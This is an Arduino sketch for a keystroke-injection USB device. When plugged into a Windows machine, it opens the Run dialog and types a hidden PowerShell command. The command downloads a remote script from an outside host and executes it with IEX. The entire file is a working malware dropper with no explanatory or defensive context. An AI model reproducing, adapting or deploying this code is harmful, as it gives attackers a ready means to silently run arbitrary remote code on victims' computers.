void setup() {
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500); 
  Keyboard.press('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("POWERSHELL -W HIDDEN -NOP -C \"IEX(nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING('HTTP://PAN.PLYZ.NET/D.ASP?U=1369254435&P=sns.PS1')\";EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();
}
void loop()
{
}
